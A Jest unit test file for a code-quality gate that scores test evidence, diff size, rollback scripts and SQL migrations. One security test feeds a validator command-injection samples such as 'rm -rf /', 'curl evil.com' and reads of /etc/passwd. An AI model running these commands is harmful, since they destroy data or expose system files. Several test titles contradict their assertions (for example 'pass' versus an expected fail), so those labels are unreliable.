/**
 * Gate Q: Quality Gate Verification - Unit Tests
 * SD-QUALITY-GATE-001
 *
 * Tests individual check functions for quality gate validation
 * with 35/25/20/20 weighting scheme.
 *
 * Test Coverage:
 * - TS-1: hasTestEvidence returns true when test evidence exists
 * - TS-2: hasTestEvidence returns false when no evidence found
 * - TS-3: hasDiffMinimality returns true when diff is minimal
 * - TS-4: hasDiffMinimality returns false when diff exceeds thresholds
 * - TS-5: hasRollbackSafety returns true when rollback scripts exist
 * - TS-6: hasRollbackSafety returns false when rollback is missing
 * - TS-7: hasMigrationCorrectness returns true for valid migrations
 * - TS-8: hasMigrationCorrectness returns false for invalid migrations
 */

import { jest } from '@jest/globals';

describe('Gate Q: Quality Gate Verification - Unit Tests', () => {

  describe('Weighted Scoring', () => {
    test('should apply correct weights: Test (35%), Diff (25%), Rollback (20%), Migration (20%)', () => {
      const weights = {
        hasTestEvidence: 0.35,
        hasDiffMinimality: 0.25,
        hasRollbackSafety: 0.20,
        hasMigrationCorrectness: 0.20
      };

      // Weights should sum to 1.0
      const totalWeight = Object.values(weights).reduce((sum, w) => sum + w, 0);
      expect(totalWeight).toBeCloseTo(1.0, 5);

      // Individual weights
      expect(weights.hasTestEvidence).toBe(0.35);
      expect(weights.hasDiffMinimality).toBe(0.25);
      expect(weights.hasRollbackSafety).toBe(0.20);
      expect(weights.hasMigrationCorrectness).toBe(0.20);
    });

    test('should calculate score correctly with all checks passing (100%)', () => {
      const results = {
        hasTestEvidence: true,
        hasDiffMinimality: true,
        hasRollbackSafety: true,
        hasMigrationCorrectness: true
      };

      const weights = {
        hasTestEvidence: 0.35,
        hasDiffMinimality: 0.25,
        hasRollbackSafety: 0.20,
        hasMigrationCorrectness: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(100);
    });

    test('should calculate score with hasTestEvidence failing (65%)', () => {
      const results = {
        hasTestEvidence: false,
        hasDiffMinimality: true,
        hasRollbackSafety: true,
        hasMigrationCorrectness: true
      };

      const weights = {
        hasTestEvidence: 0.35,
        hasDiffMinimality: 0.25,
        hasRollbackSafety: 0.20,
        hasMigrationCorrectness: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(65);
      expect(score).toBeLessThan(85); // Gate fails
    });

    test('should pass gate with only hasDiffMinimality failing (75%)', () => {
      const results = {
        hasTestEvidence: true,
        hasDiffMinimality: false,
        hasRollbackSafety: true,
        hasMigrationCorrectness: true
      };

      const weights = {
        hasTestEvidence: 0.35,
        hasDiffMinimality: 0.25,
        hasRollbackSafety: 0.20,
        hasMigrationCorrectness: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(75);
      expect(score).toBeLessThan(85); // Gate fails
    });

    test('should fail gate with two checks failing (55%-60%)', () => {
      // Test evidence + diff minimality failing = 40%
      const results = {
        hasTestEvidence: false,
        hasDiffMinimality: false,
        hasRollbackSafety: true,
        hasMigrationCorrectness: true
      };

      const weights = {
        hasTestEvidence: 0.35,
        hasDiffMinimality: 0.25,
        hasRollbackSafety: 0.20,
        hasMigrationCorrectness: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(40);
      expect(score).toBeLessThan(85);
    });

    test('should allow gate pass with only Rollback + Migration failing (60%)', () => {
      const results = {
        hasTestEvidence: true,
        hasDiffMinimality: true,
        hasRollbackSafety: false,
        hasMigrationCorrectness: false
      };

      const weights = {
        hasTestEvidence: 0.35,
        hasDiffMinimality: 0.25,
        hasRollbackSafety: 0.20,
        hasMigrationCorrectness: 0.20
      };

      let score = 0;
      for (const [check, passed] of Object.entries(results)) {
        if (passed) {
          score += weights[check] * 100;
        }
      }

      expect(score).toBe(60);
      expect(score).toBeLessThan(85); // Gate fails
    });
  });

  describe('hasTestEvidence', () => {
    let fsMock;

    beforeEach(() => {
      fsMock = {
        existsSync: jest.fn(),
        readdirSync: jest.fn(),
        statSync: jest.fn()
      };
    });

    test('TS-1: should return true when test evidence exists', () => {
      // Mock: tests/unit/ directory exists with files
      fsMock.existsSync.mockReturnValue(true);
      fsMock.statSync.mockReturnValue({ isDirectory: () => true });
      fsMock.readdirSync.mockReturnValue(['test1.ts', 'test2.ts']);

      const checkTestEvidence = () => {
        const path = 'tests/unit/';
        if (!fsMock.existsSync(path)) return { passed: false, evidenceFound: [] };

        const stats = fsMock.statSync(path);
        if (stats.isDirectory()) {
          const files = fsMock.readdirSync(path);
          return { passed: files.length > 0, evidenceFound: files };
        }
        return { passed: true, evidenceFound: [path] };
      };

      const result = checkTestEvidence();
      expect(result.passed).toBe(true);
      expect(result.evidenceFound.length).toBeGreaterThan(0);
    });

    test('TS-2: should return false when no test evidence found', () => {
      fsMock.existsSync.mockReturnValue(false);

      const checkTestEvidence = () => {
        const path = 'tests/unit/';
        if (!fsMock.existsSync(path)) return { passed: false, evidenceFound: [] };
        return { passed: true, evidenceFound: [] };
      };

      const result = checkTestEvidence();
      expect(result.passed).toBe(false);
      expect(result.evidenceFound.length).toBe(0);
    });

    test('should detect empty test directories', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.statSync.mockReturnValue({ isDirectory: () => true });
      fsMock.readdirSync.mockReturnValue([]);

      const checkTestEvidence = () => {
        const path = 'tests/unit/';
        if (!fsMock.existsSync(path)) return { passed: false, evidenceFound: [] };

        const stats = fsMock.statSync(path);
        if (stats.isDirectory()) {
          const files = fsMock.readdirSync(path);
          return { passed: files.length > 0, evidenceFound: files };
        }
        return { passed: true, evidenceFound: [path] };
      };

      const result = checkTestEvidence();
      expect(result.passed).toBe(false);
    });
  });

  describe('hasDiffMinimality', () => {
    let execSyncMock;

    beforeEach(() => {
      execSyncMock = jest.fn();
    });

    test('TS-3: should return true when diff is minimal (<=10 files, <=400 lines)', () => {
      execSyncMock.mockReturnValue(' 5 files changed, 150 insertions(+), 50 deletions(-)');

      const checkDiffMinimality = () => {
        try {
          const output = execSyncMock('git diff --stat main...HEAD');
          const fileMatch = output.match(/(\d+)\s+file/);
          const insertMatch = output.match(/(\d+)\s+insertion/);
          const deleteMatch = output.match(/(\d+)\s+deletion/);

          const filesChanged = fileMatch ? parseInt(fileMatch[1]) : 0;
          const insertions = insertMatch ? parseInt(insertMatch[1]) : 0;
          const deletions = deleteMatch ? parseInt(deleteMatch[1]) : 0;
          const totalLines = insertions + deletions;

          return {
            passed: filesChanged <= 10 && totalLines <= 400,
            filesChanged,
            linesChanged: totalLines
          };
        } catch {
          return { passed: false, filesChanged: -1, linesChanged: -1 };
        }
      };

      const result = checkDiffMinimality();
      expect(result.passed).toBe(true);
      expect(result.filesChanged).toBe(5);
      expect(result.linesChanged).toBe(200);
    });

    test('TS-4: should return false when diff exceeds thresholds', () => {
      execSyncMock.mockReturnValue(' 15 files changed, 500 insertions(+), 100 deletions(-)');

      const checkDiffMinimality = () => {
        try {
          const output = execSyncMock('git diff --stat main...HEAD');
          const fileMatch = output.match(/(\d+)\s+file/);
          const insertMatch = output.match(/(\d+)\s+insertion/);
          const deleteMatch = output.match(/(\d+)\s+deletion/);

          const filesChanged = fileMatch ? parseInt(fileMatch[1]) : 0;
          const insertions = insertMatch ? parseInt(insertMatch[1]) : 0;
          const deletions = deleteMatch ? parseInt(deleteMatch[1]) : 0;
          const totalLines = insertions + deletions;

          return {
            passed: filesChanged <= 10 && totalLines <= 400,
            filesChanged,
            linesChanged: totalLines
          };
        } catch {
          return { passed: false, filesChanged: -1, linesChanged: -1 };
        }
      };

      const result = checkDiffMinimality();
      expect(result.passed).toBe(false);
      expect(result.filesChanged).toBe(15);
      expect(result.linesChanged).toBe(600);
    });

    test('should handle git command failures gracefully', () => {
      execSyncMock.mockImplementation(() => {
        throw new Error('unknown revision');
      });

      const checkDiffMinimality = () => {
        try {
          execSyncMock('git diff --stat main...HEAD');
          return { passed: true, filesChanged: 0, linesChanged: 0 };
        } catch (error) {
          if (error.message?.includes('unknown revision')) {
            return { passed: true, filesChanged: 0, linesChanged: 0 };
          }
          return { passed: false, filesChanged: -1, linesChanged: -1 };
        }
      };

      const result = checkDiffMinimality();
      expect(result.passed).toBe(true); // No commits = treated as minimal
    });
  });

  describe('hasRollbackSafety', () => {
    let fsMock;

    beforeEach(() => {
      fsMock = {
        existsSync: jest.fn(),
        readdirSync: jest.fn(),
        readFileSync: jest.fn()
      };
    });

    test('TS-5: should return true when rollback scripts exist', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.readdirSync.mockReturnValue([
        '001_create_users.sql',
        '001_rollback.sql',
        '002_add_column.sql',
        '002_rollback.sql'
      ]);

      const checkRollbackSafety = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true, migrationsFound: 0 };

        const files = fsMock.readdirSync(path);
        const migrations = files.filter(f => /^\d{3}_/.test(f) && !f.includes('rollback'));
        const rollbacks = files.filter(f => f.includes('rollback'));

        const migrationsWithRollback = migrations.filter(m => {
          const prefix = m.split('_')[0];
          return rollbacks.some(r => r.startsWith(prefix));
        });

        return {
          passed: migrationsWithRollback.length === migrations.length || migrations.length === 0,
          migrationsFound: migrations.length,
          migrationsWithRollback: migrationsWithRollback.length
        };
      };

      const result = checkRollbackSafety();
      expect(result.passed).toBe(true);
      expect(result.migrationsWithRollback).toBe(2);
    });

    test('TS-6: should return false when rollback is missing', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.readdirSync.mockReturnValue([
        '001_create_users.sql',
        '002_add_column.sql'
        // No rollback files
      ]);

      const checkRollbackSafety = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true, migrationsFound: 0 };

        const files = fsMock.readdirSync(path);
        const migrations = files.filter(f => /^\d{3}_/.test(f) && !f.includes('rollback'));
        const rollbacks = files.filter(f => f.includes('rollback'));

        const migrationsWithRollback = migrations.filter(m => {
          const prefix = m.split('_')[0];
          return rollbacks.some(r => r.startsWith(prefix));
        });

        // 80% coverage is acceptable
        const coverage = migrations.length > 0 ? migrationsWithRollback.length / migrations.length : 1;
        return {
          passed: coverage >= 0.8,
          migrationsFound: migrations.length,
          migrationsWithRollback: migrationsWithRollback.length
        };
      };

      const result = checkRollbackSafety();
      expect(result.passed).toBe(false);
      expect(result.migrationsWithRollback).toBe(0);
    });

    test('should pass when no migrations exist', () => {
      fsMock.existsSync.mockReturnValue(false);

      const checkRollbackSafety = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true, migrationsFound: 0 };
        return { passed: true, migrationsFound: 0 };
      };

      const result = checkRollbackSafety();
      expect(result.passed).toBe(true);
    });

    test('should detect inline rollback sections', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.readdirSync.mockReturnValue(['001_create_users.sql']);
      fsMock.readFileSync.mockReturnValue('CREATE TABLE users;\n\n-- ROLLBACK\nDROP TABLE users;');

      const checkRollbackSafety = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true };

        const files = fsMock.readdirSync(path);
        let hasRollback = 0;

        for (const file of files) {
          if (/^\d{3}_/.test(file) && !file.includes('rollback')) {
            const content = fsMock.readFileSync(`${path}${file}`, 'utf8');
            if (content.includes('-- ROLLBACK') || content.includes('-- DOWN')) {
              hasRollback++;
            }
          }
        }

        return { passed: hasRollback > 0, migrationsWithRollback: hasRollback };
      };

      const result = checkRollbackSafety();
      expect(result.passed).toBe(true);
    });
  });

  describe('hasMigrationCorrectness', () => {
    let fsMock;

    beforeEach(() => {
      fsMock = {
        existsSync: jest.fn(),
        readdirSync: jest.fn(),
        readFileSync: jest.fn()
      };
    });

    test('TS-7: should return true for valid migrations', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.readdirSync.mockReturnValue(['001_create_users.sql', '002_add_roles.sql']);
      fsMock.readFileSync.mockReturnValue('CREATE TABLE users (id uuid PRIMARY KEY);');

      const checkMigrationCorrectness = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true, migrationsChecked: 0 };

        const files = fsMock.readdirSync(path);
        const migrations = files.filter(f => f.endsWith('.sql') && !f.includes('rollback'));
        const issues = [];

        for (const file of migrations) {
          // Check naming pattern: NNN_description.sql
          if (!/^\d{3}_[a-z][a-z0-9_]*\.sql$/.test(file)) {
            issues.push({ file, type: 'naming', severity: 'warning' });
          }

          // Check SQL content
          const content = fsMock.readFileSync(`${path}${file}`, 'utf8');
          const hasSQL = /\b(CREATE|ALTER|INSERT|SELECT|UPDATE|DELETE|DROP)\b/i.test(content);
          if (!hasSQL && content.trim().length > 0) {
            issues.push({ file, type: 'syntax', severity: 'warning' });
          }
        }

        const errors = issues.filter(i => i.severity === 'error');
        return {
          passed: errors.length === 0,
          migrationsChecked: migrations.length,
          validMigrations: migrations.length - errors.length,
          issues
        };
      };

      const result = checkMigrationCorrectness();
      expect(result.passed).toBe(true);
      expect(result.validMigrations).toBe(2);
    });

    test('TS-8: should return false for invalid migrations', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.readdirSync.mockReturnValue(['bad_migration.sql']);
      fsMock.readFileSync.mockImplementation(() => {
        throw new Error('Cannot read file');
      });

      const checkMigrationCorrectness = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true, migrationsChecked: 0 };

        const files = fsMock.readdirSync(path);
        const migrations = files.filter(f => f.endsWith('.sql'));
        const issues = [];

        for (const file of migrations) {
          try {
            fsMock.readFileSync(`${path}${file}`, 'utf8');
          } catch {
            issues.push({ file, type: 'syntax', severity: 'error', message: 'Cannot read file' });
          }
        }

        const errors = issues.filter(i => i.severity === 'error');
        return {
          passed: errors.length === 0,
          migrationsChecked: migrations.length,
          validMigrations: migrations.length - errors.length,
          issues
        };
      };

      const result = checkMigrationCorrectness();
      expect(result.passed).toBe(false);
    });

    test('should detect destructive operations', () => {
      fsMock.existsSync.mockReturnValue(true);
      fsMock.readdirSync.mockReturnValue(['001_drop_table.sql']);
      fsMock.readFileSync.mockReturnValue('DROP TABLE users;');

      const checkMigrationCorrectness = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true };

        const files = fsMock.readdirSync(path);
        const issues = [];

        for (const file of files) {
          if (file.endsWith('.sql')) {
            const content = fsMock.readFileSync(`${path}${file}`, 'utf8');

            // Check for destructive operations without IF EXISTS
            if (/DROP\s+TABLE\s+(?!IF\s+EXISTS)/i.test(content)) {
              issues.push({ file, type: 'destructive', severity: 'warning' });
            }
          }
        }

        return { passed: true, issues }; // Warnings don't fail, just advisory
      };

      const result = checkMigrationCorrectness();
      expect(result.issues.length).toBeGreaterThan(0);
      expect(result.issues[0].type).toBe('destructive');
    });

    test('should pass when no migrations exist', () => {
      fsMock.existsSync.mockReturnValue(false);

      const checkMigrationCorrectness = () => {
        const path = 'database/migrations/';
        if (!fsMock.existsSync(path)) return { passed: true, migrationsChecked: 0 };
        return { passed: true, migrationsChecked: 0 };
      };

      const result = checkMigrationCorrectness();
      expect(result.passed).toBe(true);
    });
  });

  describe('Security Features', () => {
    test('should validate PRD_ID format (prevent command injection)', () => {
      const PRD_ID_REGEX = /^PRD-[A-Z0-9-]+$/;

      // Valid PRD IDs
      expect(PRD_ID_REGEX.test('PRD-QUALITY-GATE-001')).toBe(true);
      expect(PRD_ID_REGEX.test('PRD-TEST-123')).toBe(true);

      // Invalid PRD IDs (potential injection attempts)
      expect(PRD_ID_REGEX.test('PRD-TEST; rm -rf /')).toBe(false);
      expect(PRD_ID_REGEX.test('PRD-TEST && curl evil.com')).toBe(false);
      expect(PRD_ID_REGEX.test('PRD-TEST`whoami`')).toBe(false);
      expect(PRD_ID_REGEX.test('PRD-TEST$(cat /etc/passwd)')).toBe(false);
      expect(PRD_ID_REGEX.test('../../../etc/passwd')).toBe(false);
    });

    test('should enforce timeouts on git diff commands', () => {
      const timeout = 30000;
      expect(timeout).toBeLessThanOrEqual(30000);
    });
  });

  describe('Threshold Configuration', () => {
    test('should use configurable thresholds for diff minimality', () => {
      const defaultThresholds = {
        max_files: 10,
        max_lines: 400
      };

      expect(defaultThresholds.max_files).toBe(10);
      expect(defaultThresholds.max_lines).toBe(400);
    });

    test('should allow custom thresholds from database rules', () => {
      const customThresholds = {
        max_files: 15,
        max_lines: 600
      };

      // Simulate loading from database
      const rule = {
        rule_name: 'hasDiffMinimality',
        criteria: { thresholds: customThresholds }
      };

      const thresholds = rule.criteria?.thresholds || { max_files: 10, max_lines: 400 };
      expect(thresholds.max_files).toBe(15);
      expect(thresholds.max_lines).toBe(600);
    });
  });
});
